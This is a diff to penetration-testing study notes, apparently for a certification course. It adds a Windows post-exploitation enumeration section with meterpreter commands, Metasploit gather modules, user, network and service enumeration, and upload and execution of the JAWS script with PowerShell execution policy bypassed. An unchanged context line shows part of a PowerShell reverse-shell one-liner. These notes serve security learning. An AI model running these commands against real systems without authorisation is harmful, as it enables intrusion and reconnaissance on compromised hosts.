@@ -1,3 +1,4 @@
+# Index
 - [SECTION 3 Host and Network Penetration Testing](#SECTION-3-Host-and-Network-Penetration-Testing)
   - System and Host Based Attacks
   - [Network-Based Attacks](#Network-Based-Attacks)
@@ -253,5 +254,92 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.
 ```
 
 ## Post-Exploitation
+### Windows Local Enumeration
+```
+meterpreter > sysinfo
+
+hostname
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+dir /b/s eula.txt
+```
+- Enumerating System Information
+
+```
+meterpreter > getuid
+meterpreter > getprivs
+
+whoami
+whoami /priv
+query user
+net users
+net user <username>
+net localgroup
+net localgroup <group>
+net localgroup Administrators
+
+use post/windows/gather/enum_logged_on_users
+set SESSION <session_id>
+```
+- Enumerating Users & Groups
+
+```
+ipconfig
+ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh advfirewall show allprofiles
+```
+- Enumerating Network Information
+  - Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output
+
+```
+meterpreter > ps
+meterpreter > ps -S <process_name>
+meterpreter > pgrep <process_name>
+
+net start
+wmic service list brief
+tasklist
+tasklist /SVC
+
+mkdir C:\Temp
+schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
+exit
+
+meterpreter > download C:\\Temp\\schtasks.txt
+```
+- Enumerating Processes & Services
+
+```
+meterpreter > show_mount
+
+use post/windows/gather/win_privs
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+use post/windows/gather/enum_computers
+use post/windows/gather/checkvm
+
+cat /root/.msf4/loot/<filename>.txt
+```
+- Automating Windows Local Enumeration
+	- Post-exploitation modules need to `set SESSION <session_id>`
+
+```
+meterpreter > mkdir C:\\Temp
+meterpreter > cd C:\\Temp
+meterpreter > upload /root/jaws-enum.ps1
+meterpreter > shell
+
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
+exit
+
+meterpreter > download C:\\Temp\\jaws-enum.txt
+```
+- JAWS - Just Another Windows Script (https://github.com/411Hall/JAWS)
 
 ## Social Engineering
